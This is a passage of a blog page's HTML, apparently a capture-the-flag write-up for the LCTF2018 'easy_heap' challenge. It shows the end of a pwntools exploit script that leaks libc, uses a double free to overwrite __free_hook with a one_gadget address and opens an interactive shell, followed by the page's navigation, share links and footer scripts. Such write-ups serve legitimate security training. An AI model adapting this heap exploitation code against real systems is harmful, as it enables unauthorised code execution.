class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;main_arean&#x27;</span>,main_arean)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base=malloc_hook-libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)+base))</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;fuck&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">one_gadget=base+<span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E8%87%B4%E6%83%85%E5%86%B5"><span class="toc-number">1.</span> <span class="toc-text">大致情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping-heap-chunk%E9%9A%94%E5%9D%97%E6%94%BB%E5%87%BB%E6%B3%84%E9%9C%B2libc"><span class="toc-number">2.</span> <span class="toc-text">overlapping heap chunk隔块攻击泄露libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#double-free-amp-amp-free-hook"><span class="toc-number">3.</span> <span class="toc-text">double free &amp;&amp; __free_hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&text=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&is_video=false&description=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tcache LCTF2018-PWN-easy_heap&body=Check out this article: https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&name=Tcache LCTF2018-PWN-easy_heap&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&t=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    Grxer
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
